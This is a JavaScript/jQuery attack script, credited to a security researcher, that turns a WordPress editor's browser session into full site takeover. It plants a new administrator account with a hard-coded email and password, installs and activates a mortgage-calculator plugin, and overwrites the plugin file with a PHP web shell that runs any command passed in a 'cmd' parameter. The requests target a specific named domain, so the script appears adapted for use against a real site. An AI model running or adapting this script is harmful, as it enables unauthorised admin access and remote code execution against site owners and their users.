// WordPress editor to admin privesc and backdooring
// Written by Sivanesh Ashok | stazot.com

// change "localhost/wordpress" to the respective wordpress domain everywhere

// backdooring with new admin
$.get("http://finantick.com/wp-admin/user-new.php", function( my_var0 ) {
	
	var nonceobj0=$(my_var0).find("#_wpnonce_create-user");

	$.ajax({
		type: 'POST',
		url: 'http://finantick.com/wp-admin/user-new.php',
		data: { 
		'action':'createuser',
		'_wpnonce_create-user':$(nonceobj0)[0].value,
		'wp_http_referer':'%2Fwordpress%2Fwp-admin%2Fuser-new.php',
		'user_login':'admin',
		'email':'Vastly4445@proton.me',
		'first_name':'',
		'last_name':'',
		'url':'',
		'pass1':'jqyvM%*ZLB^F6N!&ruLHvRnBbiH82#Nw#yNxbwN@7VXmG',
		'pass1-text':'jqyvM%*ZLB^F6N!&ruLHvRnBbiH82#Nw#yNxbwN@7VXmG',
		'pass2':'jqyvM%*ZLB^F6N!&ruLHvRnBbiH82#Nw#yNxbwN@7VXmG',
		'role':'administrator',
		'createuser':'Add+New+User'
		}
	});

}, 'html');

$.ajaxSetup({async: false});

// installing a plugin
$.get("http://finantick.com/wp-admin/plugin-install.php?s=mortgage-calculators-wp&tab=search&type=term", function( my_var1 ) {
	
	var urlobj0=$(my_var1).find("[data-slug='mortgage-calculators-wp']");

	$.ajax({
		type: 'GET',
		url: $(urlobj0)[0].href
	});

}, 'html');

// activating the plugin
$.get("http://finantick.com/plugin-install.php?s=mortgage-calculators-wp&tab=search&type=term", function( my_var2 ) {

	var urlobj1=$(my_var2).find("[aria-label='Activate Mortgage Calculators WP']");

	$.ajax({
		type: 'GET',
		url: $(urlobj1)[0].href
	});

}, 'html');

// backdooring the plugin
$.get("http://finantick.com/wp-admin/plugin-editor.php?plugin=mortgage-calculators-wp%2Fmc-plus.php&Submit=Select", function( my_var3 ) {
  
	var nonceobj1=$(my_var3).find("#nonce");

	$.ajax({
		type: 'POST',
		url: 'http://finantick.com/wp-admin/admin-ajax.php',
		data: { 
			'nonce':$(nonceobj1)[0].value,
			'_wp_http_referer':'finantick.com/wp-admin/plugin-editor.php?plugin=mortgage-calculators-wp%2Fmc-plus.php&Submit=Select',
			'newcontent':`<?php
/**
 * The plugin bootstrap file
 *
 * This file is read by WordPress to generate the plugin information in the plugin
 * admin area. This file also inc all of the dependencies used by the plugin,
 * registers the activation and deactivation functions, and defines a function
 * that starts the plugin.
 *
 * @package           mc-plus 
 *
 * @wordpress-plugin
 * Plugin Name:       Mortgage Calculators WP
 * Plugin URI:        https://www.mortgageratemath.com/
 * Description:       Monthly Mortgage Payment Calculator: Use the [mcplus] shortcode or the widget to display the calculator.
 * Version:           1.36
 * Author:            mcplus
 * Author URI:        https://www.mortgageratemath.com/
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       mortgage-calculators-wp
 * Domain Path:       /languages
 */
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
`,
			'action':'edit-theme-plugin-file',
			'file':'mortgage-calculators-wp/mc-plus.php',
			'plugin':'mortgage-calculators-wp/mc-plus.php',
			'docs-list':''
		    }
	});

}, 'html');
